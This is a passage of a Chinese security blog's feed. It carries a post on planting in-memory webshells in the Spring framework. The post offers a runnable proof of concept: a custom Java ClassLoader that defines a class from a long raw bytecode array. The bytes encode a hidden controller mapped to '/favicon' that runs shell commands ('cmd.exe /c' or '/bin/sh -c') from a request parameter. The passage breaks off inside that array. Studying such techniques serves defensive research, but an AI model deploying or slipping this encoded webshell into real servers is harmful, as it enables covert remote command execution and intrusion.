&lt;h2 id=&quot;历史背景&quot;&gt;&lt;a href=&quot;#历史背景&quot; class=&quot;headerlink&quot; title=&quot;历史背景&quot;&gt;&lt;/a&gt;历史背景&lt;/h2&gt;&lt;p&gt;参考【1】中李三师傅总结了之前比较经典的tomcat回显方式，写的很好，直接复用：&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="Tomcat" scheme="http://m0d9.me/tags/Tomcat/"/>
    
    <category term="回显" scheme="http://m0d9.me/tags/%E5%9B%9E%E6%98%BE/"/>
    
  </entry>
  
  <entry>
    <title>Java内存shell：三方框架</title>
    <link href="http://m0d9.me/2020/09/27/Java%E5%86%85%E5%AD%98shell%EF%BC%9A%E4%B8%89%E6%96%B9%E6%A1%86%E6%9E%B6/"/>
    <id>http://m0d9.me/2020/09/27/Java%E5%86%85%E5%AD%98shell%EF%BC%9A%E4%B8%89%E6%96%B9%E6%A1%86%E6%9E%B6/</id>
    <published>2020-09-27T02:06:00.000Z</published>
    <updated>2020-10-10T13:22:28.137Z</updated>
    
    <content type="html"><![CDATA[<p>前文tomcat的通用servlet内存马已经基本可以覆盖大部分的情况，针对第三方框架，思路也是一样的，姿势不同。观星实验室的师傅们在参考【1】中提到了关于Sping的姿势，这里学习记录下。</p><h2 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h2><p>具体的背景不赘述，详见参考【1】，几个重点的步骤</p><ol><li>获得当前代码运行时的上下文环境</li><li>手动注册 controller</li><li>controller 中的 Webshell 逻辑</li></ol><p>文中师傅没有给出直接运行的poc，这里给一下</p><h3 id="Show-me-the-code"><a href="#Show-me-the-code" class="headerlink" title="Show me the code"></a>Show me the code</h3><a id="more"></a><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyClassLoader</span><span class="params">(ClassLoader parent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(parent);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Class <span class="title">loadClass</span><span class="params">(String name)</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="string">&quot;reflection.MyObject&quot;</span>.equals(name))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.loadClass(name);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//                        String url = &quot;file:/Users/mody/study/java/MemShell/SpringDemo/target/test-classes/org/m0d9/sec/SpringDemo/SSOLogin.class&quot;;</span></span><br><span class="line"><span class="comment">//                        URL myUrl = new URL(url);</span></span><br><span class="line"><span class="comment">//                        URLConnection connection = myUrl.openConnection();</span></span><br><span class="line"><span class="comment">//                        InputStream input = connection.getInputStream();</span></span><br><span class="line"><span class="comment">//                        ByteArrayOutputStream buffer = new ByteArrayOutputStream();</span></span><br><span class="line"><span class="comment">//                        int data = input.read();</span></span><br><span class="line"><span class="comment">//                        while(data != -1)&#123;</span></span><br><span class="line"><span class="comment">//                            buffer.write(data);</span></span><br><span class="line"><span class="comment">//                            data = input.read();</span></span><br><span class="line"><span class="comment">//                        &#125;</span></span><br><span class="line"><span class="comment">//                        input.close();</span></span><br><span class="line"><span class="comment">//                        byte[] classData = buffer.toByteArray();</span></span><br><span class="line"><span class="comment">//                        System.out.println(Arrays.toString(classData));</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">byte</span>[] classData = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;-<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">49</span>, <span class="number">0</span>, -<span class="number">125</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">63</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">66</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">70</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">73</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">74</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">77</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">78</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">80</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">81</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">83</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">84</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">0</span>, <span class="number">86</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">87</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">88</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">90</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">93</span>, <span class="number">0</span>, <span class="number">94</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">93</span>, <span class="number">0</span>, <span class="number">95</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">93</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">0</span>, <span class="number">96</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">97</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">98</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">99</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">116</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">109</span>, <span class="number">48</span>, <span class="number">100</span>, <span class="number">57</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">112</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">68</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">79</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">103</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">103</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">47</span>, <span class="number">72</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">113</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">59</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">47</span>, <span class="number">72</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">111</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">99</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">103</span>, <span class="number">48</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">119</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">87</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">113</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">47</span>, <span class="number">72</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">113</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">47</span>, <span class="number">72</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">86</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">65</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">112</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">102</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">119</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">107</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">47</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">47</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">113</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">77</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">112</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">47</span>, <span class="number">102</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">79</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">103</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">112</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">102</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">119</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">107</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">121</span>, <span class="number">112</span>, <span class="number">101</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">101</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">103</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">104</span>, <span class="number">0</span>, <span class="number">105</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">46</span>, <span class="number">110</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">106</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">107</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">108</span>, <span class="number">0</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">119</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">111</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">112</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">45</span>, <span class="number">99</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">113</span>, <span class="number">0</span>, <span class="number">114</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">115</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">116</span>, <span class="number">0</span>, <span class="number">117</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">118</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">92</span>, <span class="number">65</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">119</span>, <span class="number">0</span>, <span class="number">120</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">121</span>, <span class="number">0</span>, <span class="number">122</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">123</span>, <span class="number">0</span>, <span class="number">109</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">124</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">125</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">0</span>, <span class="number">127</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">128</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">127</span>, <span class="number">0</span>, -<span class="number">126</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">109</span>, <span class="number">48</span>, <span class="number">100</span>, <span class="number">57</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">112</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">68</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">79</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">103</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">79</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">47</span>, <span class="number">72</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">113</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">80</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, 